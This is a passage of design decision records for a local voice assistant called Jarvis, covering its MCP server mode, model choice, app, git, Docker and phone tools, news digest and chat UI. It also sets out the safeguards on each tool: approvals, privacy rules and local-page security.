- **Why:** ChromaDB gives an index and metadata filters instead of a full scan; the copy keeps every existing memory; writing after the turn keeps embedding time out of the reply.
- **Cost:** about 1 s more at start (warmed up in a thread) and a dependency of its own. A memory saved in one turn is found by meaning from the next turn on, not within the same turn.

### ADR-085: Jarvis as an MCP server

- **Decision (2026-11-07, all as recommended):** MCP clients (Claude Code, Claude Desktop, others) run `jarvis mcp serve`, a stdio command that forwards every call to the running `jarvis serve` at `/mcp/` on the local API, with the per-launch token from `bridge.json` (the pattern of `jarvis claude-hook`). Only public tools listed in `[mcp_server] tools` are offered; the default list is weather, calculate, convert_currency, market_data, crypto_price, and web_search. Private tools are never offered, whatever the config says. Every call goes through `Agent.run_call`: the argument check, the policy gate, a one-time clearance, and the audit log (`handled_by = "mcp:<client>"`), one at a time with voice and chat turns. A call that needs a yes is asked on Jarvis's own voice, terminal, and API clients as "Claude Code wants to: Open Paint"; the client's own approval never counts. Results go back as the data and its one-line summary, without the reply hints written for Jarvis's own model; outside content stays marked as data.
- **Why:** an MCP client usually sends tool results to a cloud model, so the privacy rule decides what can be offered, not the config. Forwarding to the running Jarvis keeps one policy gate, one audit log, and a person to ask, and the client's config never changes when the token does. The client's model cannot approve its own request.
- **Cost:** tools work only while `jarvis serve` runs (a call says so otherwise). The tool list is read when the client starts, so a changed `[mcp_server] tools` needs a client restart. A call that needs a yes can wait up to `confirm_timeout_s`.

### ADR-086: Hermes 3 8B stays the default; Llama 3.2 3B is ready as an option

- **Decision (2026-11-07, as recommended):** the default local model stays `jarvis-hermes3`. `config/ollama/llama3.2-3b.Modelfile` makes `jarvis-llama3.2` (the same 8192-token context), one config line away. Measured on the live end-to-end suite: Hermes 51 of 54 in 322 s, Llama 50 of 54 in 95 s; first audio of a streamed reply 2.8 to 3.6 s against 1.2 to 1.5 s. Both passed every safety check. The tool-choice benchmark gave 89% and 88%.
- **Why:** Llama's misses are worse in kind: twice it answered with tool syntax as text ("open wikipedia and browser_type ..."), which would be read aloud, and once it made up a reply from a contact that does not exist ("Zork said hi back."). Hermes's misses were reasonable alternatives (opening Notepad for a vague request).
- **Cost:** about three times slower replies than Llama. Revisit when the guard refuses replies that contain tool names or "call X with", which would remove Llama's worst failure.

### ADR-087: Apps opened with timing, and opened or closed later

- **Decision (2026-11-07, as recommended: both):** `open_app` waits up to `[apps] open_wait_s` (10 s) for a new window and says how long it took ("Notepad is open, in 1.1 seconds"), or that the app was already running. `schedule_app` opens or closes an app later ("close Spotify in 20 minutes", "open VS Code at 9"). It is a reminder of kind `app` (migration 10 adds `action_json`), so it survives a restart and is listed and cancelled with the timers. When you schedule it, the action is rated as if it ran now, and a yes is asked then if it needs one. When it falls due, the scheduler runs it through `Agent.run_call` and the policy gate rates it again; the earlier yes answers the gate's question only for the same arguments (`ApprovedChannel`, bound to the digest), and anything else is asked as usual. An action is never run late: one that fell due while Jarvis was off is reported as missed.
- **Why:** asking again in 20 minutes would usually find you away, and a no by timeout would make "close Spotify in 20 minutes" fail exactly when it is useful; asking now, when you said it, is the meaningful yes. The gate still runs at the time, so a blocked app stays blocked.
- **Cost:** a scheduled close runs while you may be away. Apps still ask about unsaved work, and you can cancel it ("cancel the spotify one").

### ADR-088: Notes as one Markdown file per day

- **Decision (2026-11-07, as recommended):** "note that ...", "jot down ...", "write down ...", and "make a note: ..." save a timestamped line in `{documents}/Jarvis Notes/<date>.md` (`[notes] folder`), answered by the router's template stage without a model. "Read my notes", "what did I note yesterday", and "open today's notes" (Notepad) read and open them. Notes read back are marked as data, because anything can edit a file in Documents. "Add a note to ..." without "that" or a colon is left to the model, since it can mean another app.
- **Why:** plain files you own, readable without Jarvis, one per day so "yesterday's notes" is one file; the template stage makes the most common note instant and removed a wrong argument the live model passed.
- **Cost:** notes are not searched by meaning yet, and a note can only be added, not edited, by voice.

### ADR-089: Adding a row to a spreadsheet

- **Decision (2026-11-07, as recommended, with one correction):** `add_sheet_row` always asks first (risk confirm) with the row shown, and reads the row back. A workbook open in Excel is written through Excel itself (pywin32), found in the running object table or, when Excel has not registered there yet, through its workbook window (`WM_GETOBJECT`). Jarvis never saves it: the file on disk changes when you save. A closed `.xlsx` or `.xlsm` is written with openpyxl after a copy is kept in `backups\sheets` in the data folder. A `.csv` gets one line in its own delimiter. A workbook locked by another program is refused. A spreadsheet made after the file index was built triggers one rebuild before giving up.
- **Correction:** the question said "Ctrl+Z works" for the Excel route. It does not: Excel clears its undo history for changes made by another program. What holds instead: nothing is saved, so closing without saving drops the row.
- **Why:** writing into the open workbook keeps what you typed there and avoids a locked file; the backup covers what openpyxl may drop (images, some charts) when it saves.
- **Cost:** a new dependency (openpyxl). Excel converts what it is given as if you typed it ("2026-11-07" becomes a date), while openpyxl keeps text as text.

### ADR-090: Sums shown in the Calculator app

- **Decision (2026-11-07, as recommended):** `calculator_show` is offered only when you ask for the Calculator app. Jarvis works the sum out first, opens Calculator, switches it to Scientific (Alt+2, so 2 + 3 * 4 is 14), clears it, types the sum, presses Enter, and reads the display through UI Automation. Its answer is Jarvis's own; when the display differs it says both. Only + - * / and brackets are typed.
- **Why:** you see the sum in the app you asked for, and the two answers check each other.
- **Cost:** it depends on Calculator's keyboard shortcuts and its English "Display is" text (R65), and it takes the focus for about a second.

### ADR-091: Spotify through its search API and the desktop app

- **Decision (2026-11-07, as recommended):** `play_spotify` searches Spotify's Web API with client credentials (SPOTIFY_CLIENT_ID and SPOTIFY_CLIENT_SECRET in .env: no login, no Premium), opens the result in the desktop app with its `spotify:` link, and presses play on Spotify's own media session. It then checks what Spotify reports as playing and says "Playing ..." only when that matches; otherwise it says it opened the item and asks you to press play. Without the keys it opens Spotify's search for the words. The tool is public and counts as egress, so a song request right after private content asks first.
- **Why:** a song request is public data, the search API needs no account login, and checking the media session keeps Jarvis from claiming something plays when it does not.
- **Cost:** whether play starts the new item or resumes the old one is up to the Spotify app; then you press play once. Not yet tried with your keys (R67).

### ADR-092: Docker work started and waited for

- **Decision (2026-11-07, as recommended):** `docker_up` starts a compose project listed in `[docker.projects.<name>]` (`docker compose up -d` in its folder) or runs an image (`docker run -d` with only a container name and published ports). Both ask first. Then it waits up to `[docker] ready_timeout_s` until each container is healthy, or running with its published ports answering on 127.0.0.1, and says how long it took; a container that stops is reported with the end of its log, secrets hidden.
- **Why:** "start the database" is only done when you can connect to it; allowing only names and ports keeps a request from becoming an arbitrary command line.
- **Cost:** a port that answers is not always an app that is ready (R68); an image is pulled first when it is missing, which can take minutes.

### ADR-093: SSH profiles open a terminal you drive

- **Decision (2026-11-07, as recommended):** `[ssh.profiles.<name>]` (host, user, port, key) and `ssh_connect` open Windows Terminal (or a console) running `ssh` to the profile. Jarvis never types into the session, sends commands, or reads it. Host and user names are checked, so neither can start with "-" and become an ssh option.
- **Why:** a remote shell is the most powerful thing Jarvis could touch; you keep it in your own hands, and passwords and host keys are answered by you.
- **Cost:** no "check the disk on my server" by voice; that would be a later, confirm-every-command tool.

### ADR-094: Git commit and push, each after a yes

- **Decision (2026-11-07, as recommended):** repositories are listed in `[git.repos]`. `git_changes` gives the branch, the files, and the diff, from which the local model drafts the message (git tools are private, so they never reach a cloud model). `git_commit` asks with the message and the files and commits what is staged, or every change when nothing is staged. `git_push` asks again with the branch, the remote, and the number of commits (and says when it is the main branch); it sets the upstream for a new branch and never forces. Git never prompts in the background.
- **Why:** a commit is easy to undo and a push is public, but both carry your name, so both are asked; drafting from the diff locally keeps the code on the laptop.
- **Cost:** the message is only as good as the local model; you hear it before it is used. Your own commit hooks run as usual.

### ADR-095: A time on a tool that only runs now is an error

- **Decision (2026-11-07):** tool arguments the tool does not declare are still ignored, except words that mean later (`at`, `in_minutes`, `time`, `when`, `delay`, ...): those make the call invalid with "use schedule_app or set_reminder".
- **Why:** the Phase 27 benchmark had the model call `open_app(name="vs code", at="tomorrow 9")`; the ignored `at` would have opened VS Code at once.
- **Cost:** none seen; the model retries with the right tool.

### ADR-096: gemma3 with the OCR text, then Hermes loaded again

- **Decision (2026-11-07, as recommended):** `look_at_screen` captures every screen, scales it to at most 1600 pixels, and sends it to `gemma3:4b` on Ollama's own API with Windows OCR's exact text of the same pixels and the question. The vision model stays loaded `[vision] keep_alive_s` (30 s), and Hermes is loaded again in the background right after, so the next command does not wait. Secret-looking values are hidden from the OCR text and from the answer, and the answer is marked as outside content. `read_screen` (OCR only) stays for reading text word for word.
- **Why:** gemma3:4b was already installed and answered in 2 s warm, but read 2026 as 2028 on its own; with the OCR text it read the year and the amounts right in the live test. Only one of the two models fits in 4 GB, so the reload hides the swap from the next ordinary command.
- **Cost:** 15 s for a first question with the model cold and about 22 s for an immediate follow-up, since the models swap places each time (R70).

### ADR-097: The AI and tech digest from feeds, written by a cloud model

- **Decision (2026-11-07, as recommended):** `ai_news` reads the RSS and Atom feeds in `[news] feeds` (Hacker News, The Verge AI, TechCrunch AI, Google News "artificial intelligence") through the web API adapter, keeps stories from the last 36 hours, merges the same story from two feeds, and keeps 8, taking turns between feeds. A cloud model writes one sentence per story (the news is public), with Hermes as the fallback; feed text is marked as data, a story with no real text is said by its title only, and a story the model skips keeps its title. The digest is made once a day and saved as Markdown with links in `[news] folder` (`Documents/Jarvis News/<date>.md`); later requests read the file. The morning briefing gains a `news` part: "8 AI and tech stories today; say what's new in AI to hear them."
- **Why:** feeds are free, need no keys, and keep each story's link; a cloud model writes a better digest in about 3 s, while Hermes takes about 16 s.
- **Cost:** the live test found a story repeated across two feeds and invented details for link-only Hacker News items; both are fixed with tests, but a summary can still be less exact than its article (R71).

### ADR-098: Your phone for free: KDE Connect on the Wi-Fi, ntfy away from it

- **Decision (2026-11-07, your choice after the call research in RESEARCH.md section 2.4):** no paid calls. Jarvis reaches your own phone through `jarvis.adapters.phone`: KDE Connect (`kdeconnect-cli`, already installed and seeing your phone) when the phone is on the same Wi-Fi, and an ntfy push to `[phone] ntfy_topic` when it is not. Three tools:
  - `ring_phone` (safe, public): rings loudly, even on silent; away from the Wi-Fi it sends an urgent push instead. "Find my phone" and "where's my phone" are exact phrases, with no model.
  - `notify_phone(message, title)` (safe, public, egress): a notification. The way is picked when the call is prepared and pinned into its arguments, so what runs is exactly what was decided; a pinned KDE Connect send that fails is an error, never a silent push over the internet. When the push would go over the internet and the conversation holds private data, it asks first.
  - `send_to_phone(item, text)` (confirm floor, private): a file (through the file guard: inside the allowed folders, never a secret file, up to 200 MB), a web link, the clipboard, a screenshot (taken only after the yes), or text. Wi-Fi only; nothing of this goes through ntfy.
  - `set_reminder(..., on_phone=true)` ("remind me on my phone at 7"): the reminder also notifies the phone and rings it; the phone failing never stops the spoken reminder.
  - The Claude Code bridge's phone step defaults to `kdeconnect`: after `escalate_after_s` with no answer, the phone shows what Claude asks ("Answer at the PC"), then the ntfy push with answer buttons follows when a topic is set.
  - `ring_phone` and `notify_phone` are offered to MCP clients by default, so Claude Code can tell you on your phone that it finished. Both only ever reach your own phone.
- **Why:** you did not want to spend money, and "call me" really means "get my attention". KDE Connect is free and open source, keeps everything on your own network with TLS, and was already paired-ready on this laptop; ntfy is free and covers the phone away from home.
- **Cost:** KDE Connect needs the phone paired once and on the same Wi-Fi, and its command line took about 2 s to list devices here (R72). ntfy topics are readable by anyone who knows the name (R73). Jarvis cannot speak in a call to anyone; "tell mom I'll be late" stays a WhatsApp message (your choice), and calls stay WhatsApp or Phone Link calls where you talk.

### ADR-099: No calls where Jarvis speaks, for now

- **Decision (2026-11-07):** the Twilio route researched for Phase 29 (a disclosure, your message, a recorded reply transcribed on the laptop) is not built. The research and its sources stay in RESEARCH.md section 2.4.
- **Why:** it costs money every month and every minute, needs a foreign number that Indian phones label "International call", and an Indian number needs a registered business.
- **Cost:** none now. If you change your mind, the shape is ready: a disclosure first, contacts and your own number only after a confirm naming the person, emergency and short codes refused, reminders that may call you on opt-in.

### ADR-100: Six UI concepts as standalone pages with one shared kit

- **Decision (2026-11-07, as recommended):** `ui-demos/` holds six concepts (reactor, orb, edge glow, terminal, pill, constellation) and an index page. Each is one HTML file with inline CSS and JavaScript, opened by double-click, with no build step, dependencies, web fonts or network requests. They use fonts Windows 11 already has.
  - **States:** every page shows the same seven states: idle, listening, thinking, speaking, and Jarvis's own waiting for your yes, running a tool, and error.
  - **The run:** a scripted run uses real Jarvis lines from Phase 29. State buttons and keys 1 to 7 pick a state.
  - **The microphone:** "Use my microphone" drives listening from the real microphone level, and only a loudness number is read.
  - **The kit:** these parts live once in `ui-demos/_kit.js`. `scripts/build_ui_demos.py` copies it between markers in each page, and a test fails when a copy is out of date.
  - **Screenshots:** `scripts/capture_ui_demos.py` captures frozen frames (`?state=...&still`) with Playwright and Edge for the READMEs.
- **Why:** you can compare directions side by side before one is rebuilt as the real UI.
  - **No live hookup:** the local API refuses every browser page (ADR-081), and a live hookup would have meant weakening that rule.
  - **One file each:** each page opens anywhere, offline, with nothing to install.
  - **The kit:** keeps the seven states the same everywhere without a build step for whoever opens them.
- **Cost:** the pages are simulations. The real UI still has to bind these states to the `/ws` events, with a safe way for a local page to connect (R74). The real microphone was not tried, because it needs your permission in the browser.

### ADR-101: The chosen direction: the orb and the edge glow around a chat

- **Decision (2026-11-07, your choice after seeing the six concepts):** the new interface takes its shape from the orb and the edge glow, as a chat. `ui-demos/chat.html`:
  - **The orb:** sits large in the middle while the chat is empty, then glides up into the header once you talk (720 ms, a strong ease-in-out; New chat sends it back).
  - **The edge glow:** the window's edge glows in the orb's colour for the current state. It is a thin turning ring plus a soft inset bloom; the demo's wider second ring left a hard inner edge.
  - **The conversation:** your words appear in your bubble as you speak, and Jarvis's reply appears word by word while it is spoken. A confirmation is a card in the conversation with Yes and No. Once answered, it becomes a quiet line ("You said yes.").
  - **Typing:** a message box with a mic button, and a send button that becomes Stop while Jarvis works.
  - **Themes:** light and dark follow Windows, and a button switches them; the choice is remembered on this computer. The state colours are the same in both.
  - **Type:** Sitka for Jarvis's words and Segoe UI Variable for yours.
  - **Motion,** following the emil-design-eng skill: custom ease-out curves, interface motion under 300 ms, transitions rather than keyframes so changes can be interrupted, messages that enter from 98% scale with a 2 px blur and never from nothing, a press scale on every button, and reduced motion keeping fades but dropping movement.
  - **The kit:** gains `play`, `stop`, `picked`, and `data-kit-autoplay="off"`, so the chat waits for you instead of starting the scripted run.
- **Why:** you liked the orb's speaking animation and the edge glow, and asked for a chat-like interface built from them.
- **Cost:** it is still a demo, simulated on the page (ADR-100). Wiring it to `jarvis serve` is the next UI step, and needs the safe local-page connection noted in R74.

### ADR-102: Open-source readiness: no personal data, a demo GIF, and a release you start

- **Decision (2026-11-07, as recommended):**
  - **Your details become generic.** The UI demos say "your phone" instead of your phone's model, tests use made-up devices and example addresses, and the Wi-Fi address copied from a Phase 29 live test is gone. The screenshots were made again.
  - **A personal-data check.** `scripts/check_personal.py` runs in CI and as a test. It fails on home folder paths, this machine's temporary folders, home network addresses outside 192.168.1.x and 10.0.0.x, real-looking +91 numbers, real email addresses, and API keys. A short list of the obvious fakes the tests use is allowed.
  - **History.** It was checked and holds only fake keys and numbers, so nothing needs rewriting.
  - **The demo GIF.** `docs/demo.gif` is recorded from `ui-demos/chat.html` by `scripts/make_demo_gif.py`, using Playwright and Pillow with one palette for the whole run.
  - **The README:** the GIF up top, a quickstart that starts with "just look" and offline pages, and the stale lines fixed: test counts, the benchmark, the removed page.
  - **The release** is prepared, not made: RELEASING.md has the v1.21.0 checklist, every hands-on item in one list, and the exact merge and tag commands. You run them.
- **Why:** the repo is about to be shared, and live tests on a real laptop print real details. A check in CI catches the next one before it is pushed. Merging and tagging are yours, because hands-on items are still open.
- **Cost:** the check only knows patterns. A name, a device or a town can still slip through, so CONTRIBUTING.md asks for made-up values. The GIF shows the demo page, not a real Jarvis turn.

### ADR-103: The chat window, served by jarvis serve and shown as a Brave app

- **Decision (2026-11-07, as recommended):** the chat interface from ADR-101 becomes the real interface.
  - **Serving:** `jarvis serve` serves it at `http://127.0.0.1:<port>/`. The page is `src/jarvis/server/ui/chat.html`, the same file as `ui-demos/chat.html`, copied by `scripts/build_ui_demos.py` and checked by a test. With the meta tag the server adds, the page goes live; opened from disk, it is still the demo.
  - **The window:** your default browser in app mode (`--app=`). That is Brave here, with Edge or Chrome as the fallback: its own window, no tabs or address bar, and no new software.
  - **Opening it:** only when you ask: `jarvis ui`, "Open Jarvis" in the tray (also a double click on the icon), or saying "open Jarvis", which is an exact phrase for the new `open_chat` tool.
  - **The glow:** stays inside the window.
  - **History:** the last 20 turns appear when the window opens. New chat clears the view, not the history.
  - **What it does:** typed commands, the mic button as push-to-talk on Jarvis's own microphone, Stop, and confirmation cards answered with Yes and No. Questions come as cards with their options, or are answered by typing. Your spoken words appear as they are heard, replies appear word by word, and reminders and announcements show too. The state shown comes from both the voice and the agent events, the most pressing first: a waiting yes, listening, speaking, a tool, thinking, then an error.
- **Security** (this changes one rule of ADR-081):
  - **The one browser allowed:** the WebSocket now accepts a browser, but only with an Origin of exactly this page (`http://127.0.0.1:<port>` or `http://localhost:<port>`) plus the UI token.
  - **The UI token** is a separate one, kept in the data folder so an open window survives a restart. It never opens `/bridge`, `/mcp/`, or the programs' socket, and the programs' token is never accepted from a browser.
  - **The page itself:** it refuses framing (`frame-ancestors 'none'`, `X-Frame-Options: DENY`) and any request marked cross-site or same-site. A per-request nonce lets only its own two scripts run under a strict Content-Security-Policy, which allows only this computer's socket.
  - **What stays:** the Host check and the refusal of every other HTTP request that carries an Origin.
- **Why:** you approved the look, and asked for it to work for real. Serving the page from Jarvis itself keeps one origin that websites cannot read, frame, or imitate.
- **Cost:** any program running as you can read the page and its token, as it can already read bridge.json. Browser extensions in your Brave profile run in the app window too (R75).

## Open decisions

These need you; nothing is blocked on them.

1. **Phone escalation:** decided in ADR-098: KDE Connect by default, ntfy buttons once you set a topic. Twilio stays available but off.

The Claude Code hooks (once open decision 1) were installed on 2026-10-20 after `jarvis claude-hook test` passed.
The Ollama speed settings (once open decision 2) were found already set on this laptop on 2026-10-20 (`OLLAMA_FLASH_ATTENTION=1`, `OLLAMA_KV_CACHE_TYPE=q8_0`, confirmed in Ollama's log); every Phase 13 measurement includes them.

### ADR-104: Phone reminders ring, then show the text, and also go to ntfy when a topic is set

- **Context (2026-11-09 hands-on test):** a phone reminder pinged the text and then rang. KDE Connect's ring opens a full-screen ringer with only a "Found it" button, which covers the text, so the reminder looked like it said nothing.
- **Decision (the user's choice, "a mixture of all"):** a ringing alert (phone reminders) now rings first and sends the text right after, so the text is the newest notification once Found it is tapped. When `[phone] ntfy_topic` is set, the same alert also goes to ntfy at the highest priority, as one alert with a title and the text, even when KDE Connect reached the phone. A failed ntfy copy does not undo a ring that worked. Alerts that do not ring (Claude Code's questions) still use ntfy only when the phone is away.
- **Privacy:** with no topic set, nothing changes and nothing leaves the laptop and the phone. With one set, the reminder text, which you wrote for your own phone, passes through the ntfy server, as ADR-098 already allowed for alerts when you are away.
- **Rejected:** a message only, with no ring (easy to miss on silent); ntfy only (needs the app and a topic first).
